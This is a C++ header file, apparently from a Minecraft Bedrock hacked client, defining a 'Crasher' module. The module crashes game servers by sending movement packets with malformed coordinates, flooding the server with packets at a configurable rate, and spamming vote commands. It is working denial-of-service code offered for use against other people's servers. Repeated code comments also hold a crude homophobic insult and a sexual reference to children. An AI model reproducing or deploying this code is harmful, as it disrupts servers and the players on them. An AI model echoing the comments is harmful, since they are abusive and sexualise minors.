#pragma once
#include "Module.h"
class Crasher : public IModule {//Crashers by Founder don't touch, skid, steal, or else you watch gay furry porn and r into little boys
public:
	SettingEnum CrasherMode;
	int CrasherPPS = 1;

	Crasher() : IModule(0, Category::WORLD, "Crash Servers n stuff") {
	registerIntSetting("PPS", &CrasherPPS, 1, 1, 2474);
	registerEnumSetting("Method", &CrasherMode, 0);
	CrasherMode = (*new SettingEnum(this)) //Crashers by Founder don't touch, skid, steal, or else you watch gay furry porn and r into little boys
			.addEntry(EnumEntry("Realm", 0))
			.addEntry(EnumEntry("PacketStorm", 1))
		    .addEntry(EnumEntry("VoteSpam", 2));
	//Someone add 
	}
	~Crasher(){};

	virtual const char* getModuleName() override { return ("Crasher"); }
	virtual void onSendPacket(C_Packet* packet) override {
		if (CrasherMode.selected == 0) {
			if (packet->isInstanceOf<PlayerAuthInputPacket>()) {
				PlayerAuthInputPacket* InputPacket = reinterpret_cast<PlayerAuthInputPacket*>(packet);
				InputPacket->pos.x = static_cast<float>(0xFFFFFFFF);
				InputPacket->pos.y = static_cast<float>(0xFFFFFFFF);
				InputPacket->pos.z = static_cast<float>(0xFFFFFFFF);
			} else if (packet->isInstanceOf<C_MovePlayerPacket>()) {
				C_MovePlayerPacket* movePacket = reinterpret_cast<C_MovePlayerPacket*>(packet);
				movePacket->Position.x = static_cast<float>(0xFFFFFFFF);
				movePacket->Position.y = static_cast<float>(0xFFFFFFFF);
				movePacket->Position.z = static_cast<float>(0xFFFFFFFF);
				// Crashers by Founder don't touch, skid, steal, or else you watch gay furry porn and r into little boys
			}
		}
	}
	virtual void onEnable() override {
		if (g_Data.getLocalPlayer() == nullptr)
			setEnabled(false);
	}
	// Crashers by Founder don't touch, skid, steal, or else you watch gay furry porn and r into little boys
	virtual void onTick(C_GameMode* gm) override {
		if (g_Data.getLocalPlayer() == nullptr)
			setEnabled(false);
		C_MovePlayerPacket MovePlayerPacket(g_Data.getLocalPlayer(), g_Data.getLocalPlayer()->getPos()->add(vec3_t(static_cast<float>(0xFFFFFFFF), static_cast<float>(0xFFFFFFFF), static_cast<float>(0xFFFFFFFF))));
		NetworkLatencyPacket NetworkPacket;
		NetworkPacket.timeStamp = 6;
		C_SubChunkRequestPacket ChunkRequestPacket;
		//C_PlayerActionPacket PlayerActionPacket;
		//C_AnimatePacket AnimatePacket;
		//CommandRequestPacket CommandRequestPacket;
		//CommandRequestPacket.payload = std::string("FADEAWAY ON TOP");
		if (CrasherMode.selected == 1) {
			g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&ChunkRequestPacket);
			for (int PacketStorm = 0; PacketStorm < CrasherPPS; PacketStorm++) {
				g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&MovePlayerPacket);
				g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&NetworkPacket);
				//g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&PlayerActionPacket);
				//g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&AnimatePacket);
				//g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&CommandRequestPacket);
			}
		}
		if (CrasherMode.selected == 2) {
			for (int VoteSpam = 0; VoteSpam < CrasherPPS; VoteSpam++) {
				C_TextPacket textPacket;
				textPacket.message.setText("./vote");
				textPacket.sourceName.setText(g_Data.getLocalPlayer()->getNameTag()->getText());
				textPacket.xboxUserId = std::to_string(g_Data.getLocalPlayer()->getUserId());
				g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&textPacket);
			}
		}
	}
};